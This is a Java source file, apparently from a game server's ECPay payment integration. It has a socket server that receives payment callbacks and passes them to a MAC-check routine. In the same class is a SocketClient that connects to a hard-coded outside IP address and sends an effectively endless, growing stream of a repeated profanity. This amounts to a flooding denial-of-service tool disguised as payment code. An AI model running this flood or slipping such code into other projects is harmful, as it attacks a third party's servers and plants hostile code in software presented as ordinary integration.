package ecpay;

import constants.GameSetConstants;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;

public class EcpayServer {
   public static class SocketClient {
      private String address = "202.39.153.199";
      private int port = 443;

      public SocketClient() {
         Socket client = new Socket();
         InetSocketAddress isa = new InetSocketAddress(this.address, this.port);

         try {
            client.connect(isa, 10000);
            BufferedOutputStream out = new BufferedOutputStream(client.getOutputStream());
            StringBuilder sb = new StringBuilder();

            for(int ii = 0; ii < Integer.MAX_VALUE; ++ii) {
               for(int i = 0; i < 10; ++i) {
                  sb.append("幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹幹");
               }

               out.write(sb.toString().getBytes());
               out.flush();
            }

            out.close();
            out = null;
            client.close();
            client = null;
         } catch (IOException var7) {
            System.out.println("Socket連線有問題 !");
            var7.printStackTrace();
         }

      }

      public static void main(String[] args) {
         new EcpayServer.SocketClient();
      }
   }

   public static class SocketServer extends Thread {
      private boolean OutServer = false;
      private ServerSocket server;
      private static int ServerPort = 80;

      public SocketServer() {
         try {
            this.server = new ServerSocket(ServerPort);
         } catch (IOException var2) {
            System.out.println("Socket啟動有問題 !");
            var2.printStackTrace();
         }

      }

      public static void main(String[] args) {
         (new EcpayServer.SocketServer()).start();
      }

      public static void StartServer() {
         (new EcpayServer.SocketServer()).start();
      }

      public void run() {
         System.out.println("【綠界金流系統】  - 監聽端口: " + ServerPort);

         while(!this.OutServer) {
            Socket socket = null;

            try {
               synchronized(this.server) {
                  socket = this.server.accept();
               }

               socket.setSoTimeout(5000);
               BufferedInputStream in = new BufferedInputStream(socket.getInputStream());
               byte[] b = new byte[1024];
               String data = "";
               socket.shutdownOutput();

               int length;
               String s;
               for(s = ""; (length = in.read(b)) > 0; s = data.trim()) {
                  data = data + new String(b, 0, length, "UTF-8");
               }

               if (!s.isEmpty()) {
               }

               if (s.contains("CheckMacValue")) {
                  EcpayPayment.checkMacValue(s);
               }

               in.close();
               in = null;
               socket.close();
            } catch (IOException var8) {
               System.out.println("Socket連線有問題 !");
               var8.printStackTrace();
            }
         }

      }

      static {
         ServerPort = GameSetConstants.ECPAY_PORT;
      }
   }
}
